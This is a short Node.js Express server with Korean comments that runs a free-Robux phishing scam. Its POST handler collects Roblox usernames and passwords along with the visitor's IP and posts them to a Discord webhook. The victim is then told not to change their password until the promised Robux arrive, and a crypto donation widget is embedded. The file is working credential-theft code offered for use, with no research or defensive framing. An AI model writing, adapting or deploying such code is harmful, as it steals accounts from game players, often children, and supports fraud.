const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
require('dotenv').config();

const app = express();
const port = 3000;

app.use(express.static("public"));
app.set("trust proxy", true);


// 본문 파싱
app.use(bodyParser.urlencoded({
    extended: true
}));

// POST /robux 핸들러
app.post("/robux", async (req, res) => {
    const robloxId = req.body.roblox_id;
    const robloxPwd = req.body.roblox_pwd;

    // IP 가져오기
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // 디스코드 웹훅 URL
    const webhookUrl = process.env.WEBHOOK_URL;

    const content = {
        embeds: [{
            title: "📌 새로운 Roblox 계정이 도착했습니다!",
            color: 0x3498db, // 파란색 계열 (16진수)
            fields: [{
                    name: "아이디",
                    value: `\`${robloxId}\``,
                    inline: true
                },
                {
                    name: "비밀번호",
                    value: `\`${robloxPwd}\``,
                    inline: true
                },
                {
                    name: "IP 주소",
                    value: `\`${clientIp}\``,
                    inline: false
                }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    try {
        // 디스코드 웹훅으로 POST 요청
        const response = await axios.post(webhookUrl, content);

        // 사용자에게 응답
        res.send(`
<h2>빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오.</h2>
<h2>비밀번호를 올바르게 입력했는지 생각해보세요! 만약 입력된 비밀번호가 실제 비밀번호랑 같지 않다면 본인이 아닌 것으로 간주하여 로벅스를 드리지 않습니다</h2>
<h1>기부로 개발자를 도와주세요!</h1>
<iframe src="https://nowpayments.io/embeds/donation-widget?api_key=SPB4XA6-B4M4TZ4-HTHXA2C-96QC978" width="346" height="623" frameborder="0" scrolling="no" style="overflow-y: hidden;">
    Can't load widget
</iframe>
`);
    } catch (error) {
        console.error("웹훅 전송 실패:", error);
        res.status(500).send("오류 발생");
    }
});

app.listen(port, () => {
    console.log('서버 실행중');
});